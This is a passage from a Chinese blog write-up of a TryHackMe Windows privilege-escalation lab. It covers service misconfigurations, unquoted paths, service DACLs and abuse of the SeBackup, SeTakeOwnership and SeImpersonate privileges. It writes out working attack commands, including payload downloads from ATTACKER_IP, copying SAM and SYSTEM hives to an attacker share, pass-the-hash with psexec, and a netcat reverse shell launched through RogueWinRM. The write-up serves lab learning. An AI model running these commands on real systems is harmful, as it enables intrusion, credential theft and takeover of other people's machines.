<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ nc -lvp 4445</span><br></pre></td></tr></table></figure>

<p>最后，重新启动服务。 虽然在正常情况下，你可能需要等待服务自行重启，但在此处你已被分配了手动重启服务的权限，以节省一些时间。</p>
<p>你可以在cmd界面使用以下命令手动重启服务：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; sc stop windowsscheduler</span><br><span class="line">C:\&gt; sc start windowsscheduler</span><br></pre></td></tr></table></figure>

<p>注意：PowerShell 将 sc 作为 Set-Content 的别名，因此你需要使用 sc.exe 才能通过PowerShell 控制服务。 在攻击机上，你将获得一个具有 svcusr1 权限的反向 shell界面：<br><img src="https://img2022.cnblogs.com/blog/2857591/202211/2857591-20221110235514642-31436648.png" alt="image"></p>
<p>好多东西，我就不照搬了。。。。。。</p>
<p>接下来直接放做题吧</p>
<p><strong>问题一：</strong></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221615521.png?raw=true" alt="image-20241222161543400"></p>
<p>首先，用以下命令查看WindowsScheduler的服务配置</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc qc WindowsScheduler</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221618853.png?raw=true" alt="image-20241222161834781"></p>
<p>我们可以发现漏洞软件安装的服务以svcusr1账户运行，与之关联的可执行文件路径是<code>C:\Progra~2\System~1\WService.exe</code></p>
<p>顺着这个关联可执行文件，我们查看它的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls  C:\PROGRA~2\SYSTEM~1\WService.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221621616.png?raw=true" alt="image-20241222162149538"></p>
<p>发现Everyone组具有修改权限，也就是说我们能对这个文件进行修改</p>
<p>于是我们就可以生成payload覆盖此文件，此服务将会使用配置的用户账户的权限，执行payload</p>
<p>我们在攻击机上使用msfvenom生成一个exe-service的payload,通过python网络服务器传输该payload文件到目标主机上</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221630829.png?raw=true" alt="image-20241222163018743"></p>
<p>然后用目标主机的Powershell获取我们的payload</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe</span><br></pre></td></tr></table></figure>

<p>在 Windows 服务器中，我们将用payload文件替换掉服务所关联的可执行文件。 由于我们需要另一个用户来执行我们的payload文件，因此我们还要向Everyone组 授予完全权限：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; cd C:\PROGRA~2\SYSTEM~1\</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move WService.exe WService.exe.bkp</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; move C:\Users\thm-unpriv\rev-svc.exe WService.exe</span><br><span class="line">        1 file(s) moved.</span><br><span class="line"></span><br><span class="line">C:\PROGRA~2\SYSTEM~1&gt; icacls WService.exe /grant Everyone:F</span><br><span class="line">        Successfully processed 1 files.</span><br></pre></td></tr></table></figure>

<p>最后nc监听，找flag</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221631193.png?raw=true" alt="image-20241222163155111"></p>
<p><strong>问题二：</strong></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221632062.png?raw=true" alt="image-20241222163219967"></p>
<p>这个就要用到第二个知识点了，未引用的(服务所关联的)可执行文件路径</p>
<p><em>PowerShell 会将“<code>sc</code>”作为“<code>Set-Content</code>”的别名，因此如果你在 PowerShell 环境下，你需要使用“<code>sc.exe</code>”来控制服务</em></p>
<p>SCM有个特性：当SCM尝试执行目标服务关联的二进制文件时，如果文件夹名称上包含空格，就会发生错误解析</p>
<p>例如：<code>sc qc &quot;disk sorter enterprise&quot;</code></p>
<p>SCM 会尝试按表中显示的顺序搜索每个二进制文件：</p>
<ul>
<li>首先，搜索 C:\MyPrograms\Disk.exe。 如果存在，该服务将运行此可执行文件。 </li>
<li>如果Disk.exe存在，它将搜索 C:\MyPrograms\Disk Sorter.exe。 如果存在，该服务将运行此可执行文件。</li>
<li>如果Disk Sorter.exe不存在，它将搜索 C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe。 此选项预计会成功，并且通常会在默认情况下运行。</li>
</ul>
<p>那么换个角度来看，如果我们提前创建一个可被包含在路径中的，其他可执行文件(比如C:\MyPrograms\Disk.exe)，我们就能在该服务启动时，强制运行我们手动创建的可执行文件</p>
<p>而绝大多数服务所关联的可执行文件，都会默认安装在<code>C:\Program Files</code> 或 <code>C:\Program Files (x86)</code>当中，非特权用户是无法写入的。</p>
<p>不过万事皆有例外：一些安装程序可能会更改对应的安装文件夹的权限，由此导致相关服务变得易受攻击</p>
<p>管理员可能会在非默认路径下，安装服务所关联的二进制文件，如果这个路径是全局可写的，我们就可以利用该漏洞覆盖文件</p>
<p>回到题目，在例子中，管理员安装了Disk Sorter二进制文件在<code>c:\MyPrograms</code>下</p>
<p>在默认情况下，这将会继承目录C:\的权限，并且允许任何用户在其中创建文件和文件夹。</p>
<p>我们使用<code>icacls</code>来检查</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221700553.png?raw=true" alt="image-20241222170057474"></p>
<p>发现User组具有AD和WD权限，这就代表允许用户创建子目录和文件</p>
<p>剩下的步骤和上面差不多，只不过需要把payload移到<code>Disk.exe</code>，并给所有用户对文件完全的权限</p>
<p>然后弹shell就行了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221709939.png?raw=true" alt="image-20241222170951850"></p>
<p><strong>问题三：</strong></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221710643.png?raw=true" alt="image-20241222171009555"></p>
<p>问题三这个情景是基于上述两个方法都被防好了的情况下，我们仍然有一点可能对服务进行漏洞利用</p>
<p><em><strong>DACL（自由访问控制列表）</strong></em></p>
<p>如果服务本身的DACL（注意：此处并非服务对应的可执行文件的 DACL）允许你修改服务的配置，你将能够对服务进行重新配置。 这将允许你将某个服务指向你设置的任何可执行文件路径，而且可以使用你指定的任何帐户权限去运行服务所关联的可执行文件，能够指定的账户包括 SYSTEM 账户。</p>
<p>听上去是有点绕， 从头解释一遍</p>
<p><strong>关于 DACL</strong></p>
<ul>
<li><strong>定义</strong>：DACL 即自主访问控制列表（Discretionary Access Control List），它是一种安全机制，用于控制对特定对象（在这里是服务）的访问权限。简单来说，就是规定了谁能对这个服务做什么操作，比如读取、修改等。</li>
<li><strong>作用</strong>：如果服务本身的 DACL 允许你修改服务的配置，就意味着你获得了对这个服务进行重新设置的权限。</li>
</ul>
<p><strong>服务配置的修改</strong></p>
<ul>
<li><strong>可执行文件路径的指定</strong>：你可以将该服务原本指向的可执行文件路径，修改为你自己设置的任何可执行文件路径。这就好比一个人原本被安排走某条固定的上班路线，现在你有权力让他走你指定的任何一条路线去上班。</li>
<li><strong>账户权限的指定</strong>：你还能指定用任何你想要的账户权限去运行与这个服务相关联的可执行文件。其中包括 SYSTEM 账户，SYSTEM 账户是 Windows 系统中权限非常高的一个内置账户，具有系统级的完全访问权限。使用这个账户运行服务，就好像给这个服务开了一个 “特权通行证”，让它在系统中拥有最高级别的权限来执行各种操作。</li>
</ul>
<p>总的来说，就是在满足服务本身的 DACL 允许的条件下，你对这个服务有很大的控制权，可以按照你的需求来调整它的运行方式和权限等。</p>
<p>使用<code>Sysinternals</code>套件中的<code>Accesschk</code>工具，可以从命令行环境检查服务本身的DACL</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221721201.png?raw=true" alt="image-20241222172102119"></p>
<p>我们可以发现，<code>BUILTIN\USERS</code>组具有一个<code>SERVICE_ALL_ACCESS</code>权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221723338.png?raw=true" alt="image-20241222172319249"></p>
<p>这意味着：任何用户都可以对服务进行重新配置</p>
<p>接下来的一切也差不多，用msfvenom生成payload，然后移动到恰当位置并给Everyone组成员一个执行payload文件的权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F</span><br></pre></td></tr></table></figure>

<p>要更改服务所关联的可执行文件路径以及服务相关帐户，我们可以使用以下命令（使用 sc.exe 时请注意等号后的空格）：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">config</span> <span class="title">THMService</span> <span class="title">binPath</span>= &quot;<span class="title">C</span>:\<span class="title">Users</span>\<span class="title">thm</span>-<span class="title">unpriv</span>\<span class="title">rev</span>-<span class="title">svc3.exe</span>&quot; <span class="title">obj</span>= <span class="title">LocalSystem</span></span></span><br></pre></td></tr></table></figure>

<p>请注意，我们可以指定任何帐户来运行该服务。 此处我们选择了 LocalSystem，因为它是可用的最高特权帐户。 为了触发并执行我们的payload文件，我们需要重新启动服务</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\&gt; <span class="title">sc</span> <span class="title">stop</span> <span class="title">THMService</span></span></span><br><span class="line"><span class="function"><span class="title">C</span>:\&gt; <span class="title">sc</span> <span class="title">start</span> <span class="title">THMService</span></span></span><br></pre></td></tr></table></figure>

<p>然后拿Shell即可</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221725251.png?raw=true" alt="image-20241222172552163"></p>
<h3 id="滥用危险特权"><a href="#滥用危险特权" class="headerlink" title="滥用危险特权"></a>滥用危险特权</h3><p><strong>问题一：</strong></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412221727148.png?raw=true" alt="image-20241222172743056"></p>
<p>下面可以用三种方法来做这题（对应着三种权限）</p>
<h4 id="SeBackup-SeRestore"><a href="#SeBackup-SeRestore" class="headerlink" title="SeBackup &#x2F; SeRestore"></a>SeBackup &#x2F; SeRestore</h4><p>SeBackup 和 SeRestore 权限允许用户<strong>读取和写入系统中的任何文件</strong>，这样就会绕过DACL。Windows开放这个权限，主要是为了允许某些用户不用管理权限，也能从系统执行备份</p>
<p>用这个权限，攻击者可以提升自己的权限。主要利用就是查看配置，复制SAM和SYSTEM注册表配置单元以提取本地管理员的密码哈希</p>
<p>接下来开做！</p>
<p>首先在cmd中先检查我们自己的权限</p>
<p>这里要注意用管理员身份打开cmd，否则只能看到两个权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250731893.png?raw=true" alt="image-20241225073106740"></p>
<p>发现有SeBackup和SeRestore权限</p>
<p>然后是备份SAM和SYSTEM的hash值</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">reg save hklm\system C:\Users\THMBackup\system.hive #SYSTEM的hash</span><br><span class="line">reg save hklm\sam C:\Users\THMBackup\sam.hive #SAM的hash</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250733620.png?raw=true" alt="image-20241225073309526"></p>
<p>这就会创建几个包含注册表hives内容的文件</p>
<p>接下来我们就可以使用SMB或者其他方法，把这些文件复制到我们的攻击机上</p>
<p>对于SMB的话，我们可以用impacket启动一个简单的SMB服务器</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">user@attackerpc$ mkdir share</span><br><span class="line">user@attackerpc$ python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250738488.png?raw=true" alt="image-20241225073808362"></p>
<p>我们创建了一个share目录，然后接下来我们要在受害者Windows机器上使用命令，将保存的两个hash文件传输到我们的攻击机</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt; copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\</span><br><span class="line">C:\&gt; copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250741469.png?raw=true" alt="image-20241225074117274"></p>
<p>接下来用impacket来检索用户的密码hash</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250742303.png?raw=true" alt="image-20241225074232198"></p>
<p>找到了Administrator的hash，现在可以执行Pass-the-Hash攻击然后以SYSTEM权限访问目标计算机了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3.9 /opt/impacket/examples/psexec.py -hashes aad3b435b51404eeaad3b435b51404ee:13a04cdcf3f7ec41264e568127c5ca94 administrator@10.10.88.61</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250749276.png?raw=true" alt="image-20241225074930165"></p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250751907.png?raw=true" alt="image-20241225075143804"></p>
<h4 id="SeTakeOwnership"><a href="#SeTakeOwnership" class="headerlink" title="SeTakeOwnership"></a>SeTakeOwnership</h4><p>SeTakeOwnership权限允许用户获取系统上任何对象的所有权，这当中包括文件和注册表项</p>
<p>我们可以搜索SYSTEM运行的服务，并获取该服务的可执行文件的所有权</p>
<p>依旧检查检查权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250759318.png?raw=true" alt="image-20241225075912202"></p>
<p>这次要用的是一个叫Ultiman的Windows内置应用程序</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Ultiman用于在锁定屏幕期间提供Ease of Access选项</span><br><span class="line"></span><br><span class="line">*Windows 的 Ease of Access 选项主要是为了帮助有各种障碍的用户更方便地使用电脑而设计的辅助功能集合，也称为轻松访问中心，以下是其主要功能：*</span><br><span class="line"></span><br><span class="line">*视觉辅助*</span><br><span class="line"></span><br><span class="line">*放大镜：可将屏幕上的内容放大，方便视力不佳的用户查看细节。放大镜可以以全屏、单独窗口或跟随鼠标指针的透镜等形式运行，用户还能调整缩放级别和增量等。*</span><br><span class="line"></span><br><span class="line">*高对比度：提供更鲜明、更鲜艳的色彩方案，使应用程序和文本更易于查看。用户可以从下拉菜单中选择高对比度主题，并自定义文本、超链接、背景等的高对比度颜色。*</span><br><span class="line"></span><br><span class="line">*颜色过滤器：通过选择不同的颜色[滤镜]或色盲滤镜，让照片和颜色更易于分辨，改善视觉体验。*</span><br><span class="line"></span><br><span class="line">*讲述人：是一款屏幕阅读器，能描述并读出屏幕上的所有元素，如文本、按钮等。用户可以控制其启动方式，还能个性化设置讲述人的语音，包括选择不同的声音、调整语速、语调、音量等，以及改变讲述人提供的文本和控件细节级别等。*</span><br></pre></td></tr></table></figure>

<p>由于这个Utilman是以SYSTEM权限运行的，如果我们将其替换成我们的恶意二进制文件，就能获得SYSTEM权限</p>
<p>当然，有了SeTakeOwnership权限，胜利是必然的（确信）</p>
<p>在替换Ultiman之前，我们首先需要获取它的所有权</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">takeown /f C:\Windows\System32\Utilman.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250805520.png?raw=true" alt="image-20241225080539415"></p>
<p>成为文件的所有者，并不意味着拥有该文件权限，但作为所有者，可以自己分配任何权限</p>
<p>授予用户对ultiman.exe的完全权限</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250809378.png?raw=true" alt="image-20241225080920266"></p>
<p>然后我们就可以将ultiman.exe替换为cmd.exe的副本，这样我们就能通过ultiman获得带SYSTEM权限的cmd了</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy cmd.exe utilman.exe</span><br></pre></td></tr></table></figure>

<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250810839.png?raw=true" alt="image-20241225081029729"></p>
<p>然后锁定屏幕来触发ultiman</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250811808.png?raw=true" alt="image-20241225081117706"></p>
<p>点完就弹了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250811767.png?raw=true" alt="image-20241225081141657"></p>
<h4 id="SeImpersonate-SeAssignPrimaryToken"><a href="#SeImpersonate-SeAssignPrimaryToken" class="headerlink" title="SeImpersonate &#x2F; SeAssignPrimaryToken"></a>SeImpersonate &#x2F; SeAssignPrimaryToken</h4><p>这些权限允许进程模拟用户并代表用户执行操作。包括在其他用户的安全上下文中生成进程或者线程</p>
<p>FTP服务器就是个很好的例子</p>
<p>当FTP服务器运行时，如果没有模拟，假设有个用户Ann登录FTP服务器，并且尝试访问她的文件，那么FTP就会使用FTP自己的访问令牌来查询Ann的文件</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250818803.png?raw=true" alt="image-20241225081830681"></p>
<p>Ann能正常获取自己的文件，但这是因为Ann的文件对FTP开放权限</p>
<p>如果是Bill的话，FTP就无法访问Bill的文件了，因为Bill的文件并没有对FTP服务器开放权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250820681.png?raw=true" alt="image-20241225082014583"></p>
<p>这就是模拟的作用了，由于不确定用户的文件是否对FTP服务器开放权限，索性FTP直接临时使用用户的令牌，访问用户的文件，类比一下STEAM令牌就能想得通了</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250822540.png?raw=true" alt="image-20241225082200418"></p>
<p>这样无论是A B C还是D，都能轻而易举通过FTP服务器获取自己的文件了</p>
<p>作为攻击者，如果我们能利用 SeImpersonate 或 SeAssignPrimaryToken 权限控制进程，我们就可以模拟那些连接到该进程并进行身份验证的用户</p>
<p>Windwos系统中的 LOCAL SERVICE和  NETWORK SERVICE ACCOUNTS就具有此类权限。由于这些账户主要是用于受限账户生成服务</p>
<p>对此类账户提升权限我们需要从以下几步开始：</p>
<ol>
<li>生成一个进程，让用户可以连接该进程，并且对其进行身份验证</li>
<li>找到一种方法来强制特权用户连接并验证生成的恶意进程</li>
</ol>
<p>题目用的是RogueWinRM漏洞来实现这两个条件的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RogueWinRM 是一个用于 Windows 系统的本地权限提升工具。它允许从具有 SeImpersonatePrivilege 权限的服务账户提升到本地系统账户，前提是 WinRM 服务未运行（默认情况下，WinRM 服务通常是关闭的）。该项目由 Antonio Cocomazzi、Andrea Pierini 和 Roberto (0xea31) 开发，遵循 GPL-3.0 许可证。</span><br></pre></td></tr></table></figure>

<p>题目模拟的是在侵入在IIS上运行的网站，已经种下webshell的情况</p>
<p>首先查看权限</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250851276.png?raw=true" alt="image-20241225085114148"></p>
<p>在攻击机上已经有EXP了，我们直接用就行</p>
<p>RogueWinRM 漏洞利用是可能的，因为每当用户（包括非特权用户）在 Windows 中启动 BITS 服务时，它都会使用 SYSTEM 权限自动创建与端口 5985 的连接。</p>
<p>端口 5985 通常用于 WinRM 服务，它只是一个公开 Powershell 控制台的端口，以便通过网络远程使用。可以将其视为 SSH，但使用 Powershell</p>
<p><em>BITS服务：后台智能传输服务 (BITS) 可供程序员和系统管理员用于从 HTTP Web 服务器和 SMB 文件共享下载文件或将文件上传到其中。 BITS 会考虑传输成本和网络使用情况，以便最大程度地降低对用户的前台工作的影响。 BITS 还可以通过暂停和自动恢复传输来处理网络中断，即使在重启后也是如此。 BITS 包括用于创建和管理传输的 PowerShell cmdlet 以及 BitsAdmin 命令行实用工具</em></p>
<p>​	如果因为某种原因，WinRM服务未在受害者服务器上运行，攻击者就可以在端口5985上启动虚假的WinRM服务，并在启动时捕获BITS服务进行的身份验证尝试。</p>
<p>如果攻击者拥有Selmpersonate权限，他就能代表连接用户执行任意命令，SYSTEM也行</p>
<p>在运行EXP之前，先在Kali上起一个nc监听</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250859209.png?raw=true" alt="image-20241225085906091"></p>
<p>然后在webshell上使用命令触发漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c:\tools\RogueWinRM\RogueWinRM.exe -p &quot;C:\tools\nc64.exe&quot; -a &quot;-e cmd.exe 10.10.85.73 4442&quot;</span><br></pre></td></tr></table></figure>

<p>说是要等蛮久</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250900524.png?raw=true" alt="image-20241225090006387"></p>
<p> 不过一下子就拿到了，嘻嘻</p>
<p><img src="https://decole-1325896800.cos.ap-beijing.myqcloud.com/202412250900688.png?raw=true" alt="image-20241225090036575"></p>
<h4 id="滥用易受攻击软件"><a href="#滥用易受攻击软件" class="headerlink" title="滥用易受攻击软件"></a>滥用易受攻击软件</h4><p>这其实没啥说的，主要是看看Windows是不是安装了一些存在历史漏洞的软件或者补丁啥的</p>
<p>可以用wmic列出目标系统上安装的软件及其版本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmic product get name,version,vendor</span><br></pre></td></tr></table></figure>

<p>需要注意的是这可能不会返回所有已安装的程序，有的程序安装方式比较特殊，可能不会在此处列出</p>
<p> 然后用现成EXP打就行了，不是很难</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="http://example.com">deCOLE</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/">http://example.com/2025/03/18/Windows%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="http://example.com" target="_blank">deCOLE's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/TryHackMe/">TryHackMe</a></div><div class="post-share"><div class="social-share" data-image="/img/bnb.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/03/18/Windows%E5%86%85%E9%83%A8/" title="Windows内部"><img class="cover" src="/img/bnb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">上一篇</div><div class="info-item-2">Windows内部</div></div><div class="info-2"><div class="info-item-1">Windows内部进程（Processes）每个进程都提供执行程序所需要的资源 进程具有虚拟空间、可执行代码、系统对象的开放句柄、安全上下文、唯一进程标识符、环境变量、优先级类、最小和最大工作及大小、至少一个执行线程 每个进程都用单个线程（通常称为主线程）启动，但可以从其任何线程创建其他线程    进程组件 作用    私有虚拟地址空间 为进程分配虚拟内存地址   可执行程序 定义存储在虚拟地址空间中的代码和数据   开放句柄 定义进程可以访问的系统资源的句柄   安全上下文 访问令牌，定义用户、权限和其他安全信息   进程ID 进程的唯一数字标识符   线程 计划执行的进程部分   从更底层的层面来看，也就是从虚拟地址空间一层面来解释进程 进程在内存中的组件和用途大概如下    组件 用途    代码(Code) 提供进程执行的代码   全局变量(Global Variables) 存储的变量   进程堆（Process Heap） 定义数据存储的堆   进程资源(Process Resources) 定义进程的更多资源   环境块（Environment...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="Windows权限维持"><img class="cover" src="/img/bnb.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">下一篇</div><div class="info-item-2">Windows权限维持</div></div><div class="info-2"><div class="info-item-1">Windows权限维持篡改非特权账户分配组成员资格​	在这部分任务中，我们假设的前提是：攻击者已经转储了受害者机器的hash,并成功破解了所使用的非特权账户的密码 使得非特权用户能获得管理权限的最直接的方法就是:使其成为Administrators组的一部分 命令如下： 1net localgroup administrators thmuser0 /add   这将允许我们使用RDP、WinRM或者其他任何可用的远程管理服务，来访问服务器 为了降低可疑程度，可用Backup Operators组 此组中的用户将没有管理权限，但是可用读取、写入系统上的任何文件或注册表项，并且忽略任何已配置的DACL。这样我们就可以复制SAM和SYSTEM注册表配置单元的内容，然后恢复所有用户的密码hash，从而使得我们能升到Administrator 在此之前首先我们要将账户添加到Backup Operators组 1C:\&gt; net localgroup &quot;Backup Operators&quot; thmuser1...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/03/18/Windows%E5%86%85%E9%83%A8/" title="Windows内部"><img class="cover" src="/img/bnb.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows内部</div></div><div class="info-2"><div class="info-item-1">Windows内部进程（Processes）每个进程都提供执行程序所需要的资源 进程具有虚拟空间、可执行代码、系统对象的开放句柄、安全上下文、唯一进程标识符、环境变量、优先级类、最小和最大工作及大小、至少一个执行线程 每个进程都用单个线程（通常称为主线程）启动，但可以从其任何线程创建其他线程    进程组件 作用    私有虚拟地址空间 为进程分配虚拟内存地址   可执行程序 定义存储在虚拟地址空间中的代码和数据   开放句柄 定义进程可以访问的系统资源的句柄   安全上下文 访问令牌，定义用户、权限和其他安全信息   进程ID 进程的唯一数字标识符   线程 计划执行的进程部分   从更底层的层面来看，也就是从虚拟地址空间一层面来解释进程 进程在内存中的组件和用途大概如下    组件 用途    代码(Code) 提供进程执行的代码   全局变量(Global Variables) 存储的变量   进程堆（Process Heap） 定义数据存储的堆   进程资源(Process Resources) 定义进程的更多资源   环境块（Environment...</div></div></div></a><a class="pagination-related" href="/2025/03/18/Windows%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/" title="Windows权限维持"><img class="cover" src="/img/bnb.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-03-18</div><div class="info-item-2">Windows权限维持</div></div><div class="info-2"><div class="info-item-1">Windows权限维持篡改非特权账户分配组成员资格​	在这部分任务中，我们假设的前提是：攻击者已经转储了受害者机器的hash,并成功破解了所使用的非特权账户的密码 使得非特权用户能获得管理权限的最直接的方法就是:使其成为Administrators组的一部分 命令如下： 1net localgroup administrators thmuser0 /add   这将允许我们使用RDP、WinRM或者其他任何可用的远程管理服务，来访问服务器 为了降低可疑程度，可用Backup Operators组 此组中的用户将没有管理权限，但是可用读取、写入系统上的任何文件或注册表项，并且忽略任何已配置的DACL。这样我们就可以复制SAM和SYSTEM注册表配置单元的内容，然后恢复所有用户的密码hash，从而使得我们能升到Administrator 在此之前首先我们要将账户添加到Backup Operators组 1C:\&gt; net localgroup &quot;Backup 